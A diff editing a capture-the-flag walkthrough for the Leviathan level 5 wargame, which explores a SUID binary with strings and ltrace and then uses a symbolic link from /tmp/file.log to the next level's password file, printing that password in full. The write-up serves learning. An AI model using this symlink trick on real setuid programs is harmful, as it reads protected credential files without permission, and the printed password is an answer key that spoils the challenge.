@@ -10,7 +10,7 @@ You can watch the walkthrough for this level here:
 
 ## 🔍 Exploration
 
-We begin by inspecting the current directory. Checking the binary founded with SUID permissions.
+We begin by inspecting the current directory. We find an executable with SUID permissions:
 
 ```bash
 leviathan5@gibson:~$ ls
@@ -18,7 +18,7 @@ leviathan5
 leviathan5@gibson:~$ file leviathan5 
 leviathan5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=0fbe5a715bf8cd28d02bc0e989a37f9c0ab21614, for GNU/Linux 3.2.0, not stripped
 ```
-We explore the strings of the binary
+We explore its strings:
 
 ```bash
 leviathan5@gibson:~$ strings leviathan5 
@@ -114,16 +114,21 @@ _init
 ```
 
 We can observe that it looks for a specific file:
+
 ```bash
 /tmp/file.log
 Cannot find /tmp/file.log
 ```
-And if we executed, the binary ask for it:
+
+Executing the binary without the file:
+
 ```bash
 leviathan5@gibson:~$ ./leviathan5 
 Cannot find /tmp/file.log
 ```
-If we test the binary creating the file necessary we can see that it is reading the file and removing it:
+
+Let’s test it with the file:
+
 ```bash
 leviathan5@gibson:~$ echo 'This is a test' > /tmp/file.log
 leviathan5@gibson:~$ ./leviathan5 
@@ -131,9 +136,12 @@ This is a test
 leviathan5@gibson:~$ ./leviathan5 
 Cannot find /tmp/file.log
 ```
+Once the binary is executed, the file is automatically removed:
 
-Lets trace the library calls to observe how the binary works without and with file:
-- without file:
+Let’s trace the library calls using ltrace to better understand what the binary does in both cases.
+
+❌ Case 1: When /tmp/file.log does not exist
+
 ```bash
 leviathan5@gibson:~$ ltrace ./leviathan5 
 __libc_start_main(0x804910d, 1, 0xffffd384, 0 <unfinished ...>
@@ -143,7 +151,9 @@ puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
 exit(-1 <no return ...>
 +++ exited (status 255) +++
 ```
-with file:
+
+✅ Case 2: When /tmp/file.log exists
+
 ```bash
 leviathan5@gibson:~$ echo 'This is a test' > /tmp/file.log
 leviathan5@gibson:~$ ltrace ./leviathan5 
@@ -205,12 +215,21 @@ unlink("/tmp/file.log")                                                         
 leviathan5@gibson:~$
 ```
 
-The binary uses a function to open and read the file and then it removes it.  
+The binary uses standard C library functions to open and read the contents of /tmp/file.log, and then it removes the file using unlink().
 
-In this level the binary takes care of all possible command injections, however, the vulnerability is not in how we can inject a command.
+In this level, the binary does a good job protecting against command injection. It does not use insecure functions like system() or allow user-controlled input to be interpreted as a command.
 
 ## 💣 Exploitation
 
-In this case we can exploit the binary generating a linked file to the file that contains the password of Leviathan6. As we have permisions SUID as Leviathan 6, we can uses the file "file.log" as a linked file to the file that contains the password of Leviathan 6, that only Leviathan 6 can read.
+The vulnerability lies not in command injection, but in the fact that the program trusts that /tmp/file.log is a harmless file — and follows symbolic links blindly. This behavior allows us to trick the program into reading protected files using a symlink attack.
 
+So we can exploit this behavior by creating a symbolic link that points to the password file of the next level:
 
+```bash
+leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@gibson:~$ ./leviathan5 
+szo7HDB88w
+```
+
+## 🔐 Password for Leviathan 6
+szo7HDB88w
